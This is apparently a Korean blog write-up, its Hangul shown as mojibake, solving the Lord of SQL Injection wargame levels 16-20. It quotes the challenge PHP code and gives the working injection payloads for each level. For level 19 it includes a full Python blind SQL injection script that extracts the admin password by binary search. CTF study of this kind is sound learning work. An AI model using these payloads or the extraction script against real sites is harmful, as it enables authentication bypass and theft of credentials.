---
title: "[LOS] 16-20ë²ˆ ë¬¸ì œ í’€ì´(succubus,zombie assassin , nightmare, xavis, dragon)"
categories:
  - los
tags:
  - los
  - rubiya
  - los 16ë²ˆ
  - los 17ë²ˆ
  - los 18ë²ˆ
  - los 19ë²ˆ
  - los 20ë²ˆ
  - los succubus
  - los zombie assassin
  - los nightnamre
  - los xavis
  - los dragon
  
toc: true
toc_sticky: true
toc_label: "16-20ë²ˆ ë¬¸ì œ í’€ì´"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/sql.png
---

ğŸ’¡ los.rubiya.kr 16-20ë²ˆ ë¬¸ì œì— ëŒ€í•œ í’€ì´ì…ë‹ˆë‹¤.
{: .notice--warning}



# 16ë²ˆ(succubus)
## ë¬¸ì œ
![image](https://user-images.githubusercontent.com/33647663/158184340-6c81db0e-25af-4c50-bff5-6d214f049d97.png)

```php
<?php
  include "./config.php"; 
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/\'/',$_GET[id])) exit("HeHe");
  if(preg_match('/\'/',$_GET[pw])) exit("HeHe");
  $query = "select id from prob_succubus where id='{$_GET[id]}' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) solve("succubus"); 
  highlight_file(__FILE__); 
?>
```

## í’€ì´
id, pw ë³€ìˆ˜ ì „ë¶€ ì‹±ê¸€ì¿¼í„°ì— ëŒ€í•´ì„œ í•„í„°ë§ì´ ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ì´ë²ˆ ë¬¸ì œëŠ” ì–´ë–»ê²Œ í•˜ë©´ ì‹±ê¸€ì¿¼í„°ë¥¼ ë²—ì–´ë‚  ìˆ˜ ìˆëŠ”ì§€ì— ëŒ€í•œ ë¬¸ì œì…ë‹ˆë‹¤.

ë¬¸ì œ í•´ê²°ì˜ ì•„ì´ë””ì–´ëŠ” escapeë¬¸ìì…ë‹ˆë‹¤. ë§Œì•½ idì—ì„œ '\'ë¥¼ ì…ë ¥í•œë‹¤ë©´ ì¿¼ë¦¬ë¬¸ì€ ë‹¤ìŒê³¼ ê°™ì´ ë°”ë€ë‹ˆë‹¤.

```sql
select id from prob_succubus where id='\' and pw=''
```
ìœ„ì˜ ì¿¼ë¦¬ë¬¸ì€ ë‘ë²ˆì§¸ ì‹±ê¸€ì¿¼í„°ì— escapeë¬¸ìê°€ ì¶”ê°€ë˜ì–´ì„œ íŠ¹ìˆ˜ë¬¸ìì˜ ì‹±ê¸€ì¿¼í„° ê¸°ëŠ¥ì´ ì•„ë‹Œ, ë¬¸ìì—´ì— ìˆëŠ” ë¬¸ì ì‹±ê¸€ì¿¼í„°ë¡œ ê¸°ëŠ¥ì´ ë°”ë€Œê²Œ ë˜ì–´ì„œ í˜„ì¬ ì•„ì´ë”” ê°’ì€ ì•„ë˜ì™€ ê°™ì´ ë°”ë€ê²ƒì…ë‹ˆë‹¤. 

```
id =' and pw=
```
ë”°ë¼ì„œ pwì— ì…ë ¥í•˜ëŠ” ë¬¸ìëŠ” ë¬¸ìì—´ ë‚´ì˜ ë¬¸ìê°€ ì•„ë‹ˆë¼ dbì—ì„œ ì¿¼ë¦¬ê°€ ì‘ë™í•˜ëŠ” ë¬¸ìì…ë‹ˆë‹¤. ë‹¤ìŒê³¼ ê°™ì´ pwê°’ì„ ì…ë ¥í•´ì¤˜ì„œ ì¿¼ë¦¬ë¬¸ì„ ì™„ì„± ì‹œì¼œì¤ë‹ˆë‹¤.

```php
id=\
pw=||1#
```

![image](https://user-images.githubusercontent.com/33647663/158156749-810d221e-7ebd-460b-bd68-19271d2d9dde.png)



# 17ë²ˆ(zombie assassin)
## ë¬¸ì œ
![image](https://user-images.githubusercontent.com/33647663/158157453-8c3cfead-1db7-4b3a-89c2-7a246ee78ee0.png)


## í’€ì´
16ë²ˆê³¼ í’€ì–´ì•¼ í•˜ëŠ” ì•„ì´ë””ì–´ëŠ” ë™ì¼í•©ë‹ˆë‹¤. escape ë¬¸ìë¥¼ ì´ìš©í•˜ì—¬ ë¬¸ìì—´ì„ íƒˆì¶œí•˜ì—¬ dbí•¨ìˆ˜ë¥¼ ì´ìš©í•˜ëŠ” ë¬¸ì œì…ë‹ˆë‹¤.

ë‹¤ìŒê³¼ ê°™ì´ ì…ë ¥í•˜ë©´ í’€ë¦½ë‹ˆë‹¤.

```
id="
pw=#1||
```

![image](https://user-images.githubusercontent.com/33647663/158157856-e5ba3e6b-5ea4-4077-bb80-eacf1a3c4bf1.png)

# 18ë²ˆ(nightmare)
## ë¬¸ì œ
![image](https://user-images.githubusercontent.com/33647663/158159705-58aa122d-9423-41d3-ab14-cd334f5e3afa.png)

## í’€ì´
ì´ ë¬¸ì œëŠ” í¬ê²Œ 2ê°€ì§€ ê°œë…ì„ ì•Œê³  ìˆì–´ì•¼ í•©ë‹ˆë‹¤.

1. False Injection
2. ì£¼ì„ ìš°íšŒ ê¸°ë²•

### False Injection
ìš°ì„  False Injectionì´ë€ ë‹¤ìŒì˜ ì¿¼ë¦¬ë¬¸ì„ ë³´ì‹œë©´ ë©ë‹ˆë‹¤.

```sql
select * from test where pw=''=0;
```

ìœ„ì˜ ì¿¼ë¦¬ë¬¸ ì¤‘ whereì ˆì˜ ì¡°ê±´ì€ í•­ìƒ 'ì°¸'ì¸ ê²°ê³¼ê°€ ë‚˜ì˜µë‹ˆë‹¤. ê·¸ ì´ìœ ëŠ” where ì ˆì—ì„œì˜ ë™ì‘ì´ ë‹¤ìŒì˜ ìˆœì„œë¡œ ì´ë£¨ì–´ì§€ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.

1. pw='' -> false
2. false = 0  -> true

ì•„ë˜ì™€ ê°™ì´ sql ì—ì„œëŠ” false = 0ì˜ ì—°ì‚°ì— ëŒ€í•´ì„œ 'ì°¸'ìœ¼ë¡œ íŒë‹¨í•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/158160387-3dd7a6aa-d6a5-4edf-9093-3a483f343301.png)

ìœ„ì˜ ê²°ê³¼ì— ë”°ë¼ì„œ ì´ë²ˆ ë¬¸ì œì—ì„œëŠ” ')=0ì„ ì…ë ¥í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì´ ì¿¼ë¦¬ë¬¸ì´ ì™„ì„±ë©ë‹ˆë‹¤.

```sql
select id from prob_nightmare where pw=('')=0
```

ìœ„ì˜ where ì ˆì€ í•­ìƒ trueë¥¼ ë°˜í™˜í•˜ëŠ” ìƒíƒœì´ê³  ì´ ë’¤ë¡œëŠ” ì£¼ì„ì²˜ë¦¬ë¥¼ í•´ì¤˜ì•¼ í•©ë‹ˆë‹¤.

### ì£¼ì„ ìš°íšŒ ê¸°ë²•
mysqlì—ì„œ ë‚¨ì€ ë’·ë¶€ë¶„ì— ëŒ€í•œ ì£¼ì„ì²˜ë¦¬ë¥¼ í•˜ê¸° ìœ„í•´ì„œ ê°€ì¥ ë§ì´ ì‚¬ìš©í•˜ëŠ” 2ê°€ì§€ ê¸°ë²•ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

1. --%20
2. %23(#ê¸°í˜¸)

í•˜ì§€ë§Œ ì¶”ê°€ì ìœ¼ë¡œ ë‹¤ìŒê³¼ ê°™ì€ ë°©ë²•ë„ ê°€ëŠ¥í•©ë‹ˆë‹¤.

3. ;%00

ë³¸ ë¬¸ì œì—ì„œëŠ” 1,2ë²ˆ ë°©ë²•ì— ëŒ€í•´ì„œ í•„í„°ë§ì„ í•˜ê³  ìˆê¸° ë•Œë¬¸ì— 3ë²ˆì˜ ë°©ë²•ì„ ì´ìš©í•©ë‹ˆë‹¤.

ë”°ë¼ì„œ ë¬¸ì œì—ì„œ ìš”êµ¬í•˜ëŠ” 6ê¸€ì ì´ë‚´ì˜ pwëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

```
pw=')=0;%00
```

![image](https://user-images.githubusercontent.com/33647663/158161279-774633ce-5a99-421e-895c-0ae4871dc301.png)

# 19ë²ˆ(xavis)
## ë¬¸ì œ

![image](https://user-images.githubusercontent.com/33647663/158161848-cf37be69-2324-4107-8c0e-740987efbd7f.png)


```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/regex|like/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("xavis"); 
  highlight_file(__FILE__); 
?>
```

## í’€ì´
regex,likeì— ëŒ€í•œ í•„í„°ë§ë§Œ ê±¸ë ¤ìˆëŠ” blind sql injection ë¬¸ì œì…ë‹ˆë‹¤. ìœ„ì— 2ê°œë¥¼ ì‚¬ìš©í•˜ì§€ ì•Šê³  í‰ë²”í•˜ê²Œ blind sql injectionì„ ìˆ˜í–‰í•´ ì¤ë‹ˆë‹¤.

í‰ë²”í•˜ê²Œ sql injectionì„ ìˆ˜í–‰í•˜ë©´ ë¹„ë°€ë²ˆí˜¸ê°€ 12ìë¦¬ ë¼ëŠ” ê²ƒê¹Œì§€ëŠ” êµ¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```python
for i in range(30):
    payload="' or id='admin' and length(pw)={}#".format(i)
    print(payload)
    params["pw"] = payload
    response = requests.get(url,params=params,cookies=cookies)
    if("Hello admin" in response.text):
        print("find the pw_length",i)
        break

```

``` 
' or id='admin' and length(pw)=0#
' or id='admin' and length(pw)=1#
' or id='admin' and length(pw)=2#
' or id='admin' and length(pw)=3#
' or id='admin' and length(pw)=4#
' or id='admin' and length(pw)=5#
' or id='admin' and length(pw)=6#
' or id='admin' and length(pw)=7#
' or id='admin' and length(pw)=8#
' or id='admin' and length(pw)=9#
' or id='admin' and length(pw)=10#
' or id='admin' and length(pw)=11#
' or id='admin' and length(pw)=12#
find the pw_length 12
```

í•˜ì§€ë§Œ, ê¸°ì¡´ì— blind sql injectionì„ ìˆ˜í–‰í•  ë•ŒëŠ” ë¹„ë°€ë²ˆí˜¸ê°€ ì˜ì–´ + ìˆ«ìì˜ ì¡°í•©ì´ë¼ê³  ê°€ì •í•˜ì—¬ ìˆ˜í–‰í–ˆê¸° ë•Œë¬¸ì— ì´ë²ˆ ë¬¸ì œì—ì„œëŠ” í’€ë¦¬ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤.

í•œì°¸ ì‚½ì§ˆì„ í•œ ê²°ê³¼ ì´ë²ˆ ë¬¸ì œì—ì„œëŠ” ë‹µì´ í•œê¸€ì´ë¼ëŠ” ì‚¬ì‹¤ì„ ì•Œì•˜ìŠµë‹ˆë‹¤.

í•œê¸€ì´ë‚˜ ë‹¤ë¥¸ ì•„ìŠ¤í‚¤ê°€ ì•„ë‹Œ UTF ë¬¸ìê°€ ì„ì—¬ ìˆë‹¤ë©´, ëª‡ê°€ì§€ ì œì•½ ì‚¬í•­ì´ ìƒê¹ë‹ˆë‹¤. blind sql injectionì„ ìµœëŒ€í•œ ì¼ë°˜ì ì¸ ìƒí™©ì—ì„œ í•´ê²°í•  ìˆ˜ ìˆë„ë¡ ì‘ì„±í•  í•„ìš”ê°€ ìˆì–´ì„œ ìš°ì„  í—·ê°ˆë¦¬ëŠ” ê°œë…ë¶€í„° ì •ë¦¬ë¥¼ í•´ë†“ê² ìŠµë‹ˆë‹¤.

### ë¬¸ìì—´ì˜ ê¸¸ì´
UTFë¡œ ì¸ì½”ë”©ëœ ë¬¸ìê°€ ë“¤ì–´ê°€ë©´ length()ì˜ ë¦¬í„´ ê°’ì´ ê¸°ì¡´ê³¼ ì¡°ê¸ˆ ë‹¤ë¦…ë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/158164579-282f41ed-4163-45fa-890f-066aeb0aa69f.png)

í˜„ì¬ ì œ pc ë¡œì»¬ì— ê¹”ë ¤ìˆëŠ” dbì—ì„œ í…ŒìŠ¤íŠ¸ í•´ë´¤ì„ ë•ŒëŠ” í•œê¸€ í•œê¸€ìë¥¼ 3ê¸€ìë¡œ ë¦¬í„´í•´ ì¤ë‹ˆë‹¤. ìœ ë‹ˆì½”ë“œë¥¼ ì–´ë– í•œ ë°©ì‹ìœ¼ë¡œ ì¸ì½”ë”© í•˜ëŠëƒì— ë”°ë¼ì„œ ê²°ê³¼ëŠ” ë‹¤ë¦…ë‹ˆë‹¤. í˜„ì¬ UTF8ë¡œ ì¸ì½”ë”© ë˜ì–´ ìˆê¸° ë•Œë¬¸ì— 3ê¸€ìì´ë©°, UTF32ë¡œ ì¸ì½”ë”©ì„ í•œë‹¤ë©´ 4ë°”ì´íŠ¸ê°€ ë‚˜ì˜¬ ìˆ˜ë„ìˆìŠµë‹ˆë‹¤.

substr í•¨ìˆ˜ë¥¼ í†µí•´ì„œ í•œê¸€ìë¥¼ ìë¥´ë©´ 3byteê°€ ì „ë¶€ ë¦¬í„´ë©ë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/158164892-69fd4529-c798-452a-97bf-60e36fc8ec4b.png)

ë˜í•œ ê¸°ì¡´ì—ëŠ” ë¬¸ìì—´ ë¹„êµë¥¼ ìœ„í•´ì„œ ascii í•¨ìˆ˜ë¥¼ ì‚¬ìš©í–ˆë‹¤ë©´, UTF ì´ìƒì˜ ë¬¸ìì—ì„œëŠ” asciië¥¼ ì‚¬ìš©í•˜ë©´ ì›í•˜ëŠ” ê²°ê³¼ê°€ ë‚˜ì˜¤ì§€ ì•ŠìŠµë‹ˆë‹¤. 2byteì´ìƒì˜ ê¸€ìì— ëŒ€í•´ì„œëŠ” ord í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/158165096-2c38bba0-9451-42d9-aa2a-28785be5963b.png)

**ascii í•¨ìˆ˜ëŠ” 3ë°”ì´íŠ¸ ì¤‘ ê°€ì¥ ì²«ë²ˆì§¸ 1ë°”ì´íŠ¸ì— ëŒ€í•œ ê°’ë§Œ êµ¬í•´ì¤ë‹ˆë‹¤**

ì´ì •ë„ë¡œ ì •ë¦¬ë¥¼ í•˜ê³  ì´ ê°œë…ì„ ì´ìš©í•˜ì—¬ blind sql injectionì„ ìˆ˜í–‰í•´ ë³´ê² ìŠµë‹ˆë‹¤.

ì €ëŠ” ë‹¤ìŒì˜ ë¡œì§ìœ¼ë¡œ ì½”ë“œë¥¼ êµ¬ì„±í–ˆìŠµë‹ˆë‹¤.

1. í•˜ë‚˜ì˜ ê¸€ìë§ˆë‹¤ substrìœ¼ë¡œ ìë¥´ê³ , ê·¸ í¬ê¸°ê°€ ì‹¤ì œë¡œ ëª‡ ë°”ì´íŠ¸ì¸ì§€ í™•ì¸ì„ í•©ë‹ˆë‹¤. (ì „ì²´ ë¬¸ìì—´ì˜ ê¸¸ì´ë¥¼ ì •í™•í•˜ê²Œ ì¸¡ì •í•˜ê¸° ìœ„í•´ì„œ)
2. í•˜ë‚˜ì˜ ê¸€ìì— ëŒ€í•´ì„œ ord í•¨ìˆ˜ë¥¼ í†µí•´ì„œ 10ì§„ìˆ˜ë¡œ ë³€í™˜ëœ ê°’ì„ êµ¬í•©ë‹ˆë‹¤.
3. ì´ë ‡ê²Œ êµ¬í•œ ê²°ê³¼ë“¤ì„ í•˜ë‚˜ì˜ ê¸€ìë‹¹ ëª‡ ë°”ì´íŠ¸ì´ë©°, ê°’ì´ ëª‡ì¸ì§€ë¥¼ ë³´ê³  ì¸ì½”ë”© ê²°ê³¼ë¥¼ ì¶”ë¡ í•©ë‹ˆë‹¤.

3ë²ˆì˜ ê²½ìš°ê°€ ê²½í—˜ì´ í•„ìš”í•œ ë¶€ë¶„ì¸ë°, ë˜‘ê°™ì€ í•œê¸€ì´ ìœ ë‹ˆì½”ë“œë¡œ ì €ì¥ë˜ì—ˆë‹¤ê³  í•´ë„, UTF8ì¸ì§€ UTF32ì¸ì§€ë“±ì— ë”°ë¼ì„œ ë‹¤ ê²°ê³¼ê°€ ë‹¤ë¦…ë‹ˆë‹¤. í˜„ì¬ ë¬¸ì œì˜ ê²½ìš° í•˜ë‚˜ì˜ ê¸€ìê°€ 4ë°”ì´íŠ¸ì„ì„ ë³´ë©´ UTF8ì´ ì•„ë‹Œ UTF32ë¡œ ì €ì¥ë˜ì–´ ìˆìœ¼ë©° ê·¸ë ‡ê¸° ë•Œë¬¸ì— ë”°ë¡œ ì¸ì½”ë”© ë³€í™˜ ì—†ì´ chr(50864)ê°™ì´ ì¶œë ¥ì„ í•´ì£¼ë©´ ë°ì´í„°ê°€ ì„±ê³µì ìœ¼ë¡œ ì¶œë ¥ë©ë‹ˆë‹¤. 

ë‚˜ì¤‘ì— ë‹¤ë¥¸ ë¬¸ì œì—ì„œëŠ” ì¸ì½”ë”©ì´ ë‹¤ë¥¼ìˆ˜ë„ ìˆìœ¼ë‹ˆ ê¼­ ê¸°ì–µì„ í•´ë†“ì•„ì•¼ í•˜ëŠ” ë¶€ë¶„ì…ë‹ˆë‹¤.

ì°¸ê³ í•œ ë¸”ë¡œê·¸ : [https://hyoje420.tistory.com/3](https://hyoje420.tistory.com/3){: target="_blank"}

ì œê°€ ì‘ì„±í•œ ì „ì²´ ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

```python
import requests

url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php"
cookies = {"PHPSESSID" : "1t87momi7f10m7tl6kkv6t0lob"}
params = {"pw" : None}

# ë¹„ë°€ë²ˆí˜¸ ê¸¸ì´ êµ¬í•˜ê¸°
for i in range(30):
    payload="' or id='admin' and length(pw)={}#".format(i)
    print(payload)
    params["pw"] = payload
    response = requests.get(url,params=params,cookies=cookies)
    if("Hello admin" in response.text):
        print("find the pw_length",i)
        break

# ê¸¸ì´ 12ìë¦¬
pw_length = 12
current_length = 0
idx = 0
flag = []
while(current_length<pw_length):
    idx = idx + 1
    # substrìœ¼ë¡œ í•œê¸€ìì”© ìë¥´ë©´ì„œ ê·¸ ê¸€ìê°€ ëª‡ ê¸€ìì¸ì§€ ì²´í¬(í•œê¸€ì´ë©´ 3ê¸€ì, ì˜ì–´ ìˆ«ìë©´ 1ê¸€ì)
    for i in range(1,5):
        payload = "' or id='admin' and length(substr(pw,{},1))={}#".format(idx,i)
        params["pw"] = payload
        response = requests.get(url,params=params,cookies=cookies)
        if("Hello admin" in response.text):
            current_length = current_length + i
            print("{}ë²ˆì§¸ í•œê¸€ìëŠ” {}ë°”ì´íŠ¸ ì§œë¦¬".format(idx,i))
            break
    
    # ì°¾ì•„ì•¼ í•  ìˆ«ìì˜ ë²”ìœ„ê°€ ë§¤ìš° í¬ë¯€ë¡œ ì´ì§„íƒìƒ‰ ì•Œê³ ë¦¬ì¦˜ ì ìš©
    start,end=0,2**32       # 0 ë¶€í„° 4byteê¹Œì§€ë¥¼ ë²”ìœ„ë¡œ ì„¤ì •
    while True:
        search = int((start + end)/2)
        payload = "' or id='admin' and ord(substr(pw,{},1))<={}#".format(idx,search)
        params["pw"] = payload
        response = requests.get(url,params=params,cookies=cookies)
        if("Hello admin" in response.text):
            print("[+]",payload)
            payload = "' or id='admin' and ord(substr(pw,{},1))={}#".format(idx,search)
            params["pw"] = payload
            response = requests.get(url,params=params,cookies=cookies)
            if("Hello admin" in response.text):
                flag.append(search)
                print("[+++] find the flag",flag)
                break
            end = search
        else:
            print("[-]",payload)
            start = search

for i in flag:
    print(chr(i),end='')
```
![image](https://user-images.githubusercontent.com/33647663/158178908-aa980258-37fe-4fa2-804a-bd029729274e.png)

![image](https://user-images.githubusercontent.com/33647663/158178991-d13120ee-8461-46cd-8abd-b9e2dd175032.png)


# 20ë²ˆ(dragon)
## ë¬¸ì œ
![image](https://user-images.githubusercontent.com/33647663/158182653-c9cc2410-35b1-40af-8f91-5691584beead.png)

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_dragon where id='guest'# and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("dragon");
  highlight_file(__FILE__); 
?>
```

## í’€ì´
ì´ë²ˆ ë¬¸ì œëŠ” ì£¼ì„ì„ ìš°íšŒí•˜ì—¬ adminê³„ì •ì˜ ì •ë³´ë¥¼ ê°€ì ¸ì˜¤ëŠ” ê²ƒì…ë‹ˆë‹¤.

ê¸°ë³¸ì ìœ¼ë¡œ ë§¤ë²ˆ ì‚¬ìš©í•˜ëŠ” #ì£¼ì„ì´ë‚˜, --ì£¼ì„ì€ í•œ ì¤„ ì£¼ì„ì…ë‹ˆë‹¤. ì´ ë§ì€ ì£¼ì„ì„ í•˜ëŠ” ë¶€ë¶„ì´ ì¤„ë°”ê¿ˆì´ ë˜ë©´ ê·¸ ë¶€ë¶„ì€ ì£¼ì„ì²˜ë¦¬ê°€ ë˜ì§€ ì•ŠëŠ”ë‹¤ëŠ” ì˜ë¯¸ ì…ë‹ˆë‹¤.

ë”°ë¼ì„œ ì¤„ ë°”ê¿ˆ(0x0a)ì„ í•œ ë’¤ì— ì¿¼ë¦¬ë¬¸ì„ ì…ë ¥í•´ ì£¼ë©´ ë©ë‹ˆë‹¤.

```
pw=%20%0a or id='admin' order by id%23
```

pwë¶€ë¶„ì—ì„œ ì¤„ë°”ê¿ˆ ì „ê¹Œì§€ê°€ ì£¼ì„ì— ì˜í•´ì„œ ì‚¬ë¼ì§€ê³  ê·¸ ë’¤ì— ë¶€ë¶„ì´ ì‹¤í–‰ë˜ì–´ì„œ adminì´ ì¶œë ¥ë©ë‹ˆë‹¤.

![image](https://user-images.githubusercontent.com/33647663/158183666-21e073f4-83e2-47ac-bae3-32021ccaf86d.png)

